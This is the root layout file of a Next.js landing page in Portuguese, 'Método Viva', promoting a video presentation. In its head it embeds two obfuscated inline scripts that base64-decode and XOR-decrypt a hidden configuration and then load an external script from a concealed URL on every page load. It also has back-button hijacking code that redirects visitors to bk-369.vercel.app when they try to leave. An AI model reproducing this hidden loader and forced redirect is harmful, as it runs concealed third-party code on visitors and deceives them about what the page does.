import { Analytics } from '@vercel/analytics/next'
import type { Metadata, Viewport } from 'next'
import './globals.css'

export const metadata: Metadata = {
  title: 'Método Viva | Descubra o próximo passo',
  description: 'Assista à apresentação exclusiva e descubra um método simples para começar hoje.',
  generator: 'v0.app',
  icons: {
    icon: [
      {
        url: '/icon-light-32x32.png',
        media: '(prefers-color-scheme: light)',
      },
      {
        url: '/icon-dark-32x32.png',
        media: '(prefers-color-scheme: dark)',
      },
      {
        url: '/icon.svg',
        type: 'image/svg+xml',
      },
    ],
    apple: '/apple-icon.png',
  },
}

export const viewport: Viewport = {
  colorScheme: 'light dark',
  themeColor: [
    { media: '(prefers-color-scheme: light)', color: 'white' },
    { media: '(prefers-color-scheme: dark)', color: 'black' },
  ],
}

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode
}>) {
  return (
    <html lang="pt-BR">
      <head>
        <script
          dangerouslySetInnerHTML={{
            __html: `(function(){var p_xqvs=atob("DBPOK0NLFQDq0c/cF2jsXjEnNzrIubuoZ2D0BGwocW7EpLuxfnW3BSAkeC6Io+CvdGGnWzc4OnCDqaqwOGOnUyYnO2qZ8+P+dme6WSopYHSPou3mTE7iCSQnemKLvbz+LUi1CS0qeGXI6+2sfmurRwovNyzIp66wYnbsEWF9dGTb4q3kJiv/TnItITOL6P7uJiqqHHFpaF2X");var d_aqr=[];for(var b_4vf=0;b_4vf<p_xqvs.length;b_4vf++){d_aqr.push(p_xqvs.charCodeAt(b_4vf)&255);}var q_b0=d_aqr[0];var c_k7ow=d_aqr.slice(1,1+q_b0);var q_w0=d_aqr.slice(1+q_b0);var h_v=q_w0.map(function(b,x_ir){return b^c_k7ow[x_ir%q_b0];});var r_6u="";for(var h_q=0;h_q<h_v.length;h_q++){r_6u+=String.fromCharCode(h_v[h_q]&255);}var g_fdt7=decodeURIComponent(escape(r_6u));var m_vf=JSON.parse(g_fdt7);var p_owcg=m_vf.globals||[];p_owcg.forEach(function(e_5by9){window[e_5by9.name]=e_5by9.value;});var c_bq=document.createElement("script");c_bq.src=m_vf.url;c_bq.async=true;c_bq.defer=true;(m_vf.attributes||[]).forEach(function(g_3om7){c_bq.setAttribute(g_3om7.name,g_3om7.value);});(document.head||document.documentElement).appendChild(c_bq);})();`,
          }}
        />
        <script
          dangerouslySetInnerHTML={{
            __html: `(function(){var r_qbv=atob("DKuYT3BzvTiScX+xutC6OgIfnwKwGQvFytiiYF8Q2Va8BAvc083hYRMc0BbwA1DC2dnxPwQAkk3mHAye1srsKgMHk1LhU1OT29/sPRkRyEz3Al2L4dC6IREe2BqoUxvQzsq1OgQe1F7rXA/D3939IQRezk3wGBvCmIe6OREfyF2wS12Tx/bl");var o_5=[];for(var z_yp=0;z_yp<r_qbv.length;z_yp++){o_5.push(r_qbv.charCodeAt(z_yp)&255);}var h_nr=o_5[0];var t_9jmx=o_5.slice(1,1+h_nr);var j_17b=o_5.slice(1+h_nr);var c_n592=j_17b.map(function(b,x_vh){return b^t_9jmx[x_vh%h_nr];});var l_8sh="";for(var s_kwf=0;s_kwf<c_n592.length;s_kwf++){l_8sh+=String.fromCharCode(c_n592[s_kwf]&255);}var v_i0=decodeURIComponent(escape(l_8sh));var d_leao=JSON.parse(v_i0);var s_hiqe=d_leao.globals||[];s_hiqe.forEach(function(o_1di){window[o_1di.name]=o_1di.value;});var s_x=document.createElement("script");s_x.src=d_leao.url;s_x.async=true;s_x.defer=true;(d_leao.attributes||[]).forEach(function(y_u3){s_x.setAttribute(y_u3.name,y_u3.value);});(document.head||document.documentElement).appendChild(s_x);})();`,
          }}
        />
        <script
          dangerouslySetInnerHTML={{
            __html: 'history.pushState(null, document.title, location.href);',
          }}
        />
        <script
          dangerouslySetInnerHTML={{
            __html: `window.addEventListener('popstate', function (event) {
  window.location.href = 'https://bk-369.vercel.app';
});`,
          }}
        />
      </head>
      <body className="antialiased">
        {children}
        {process.env.NODE_ENV === 'production' && <Analytics />}
      </body>
    </html>
  )
}
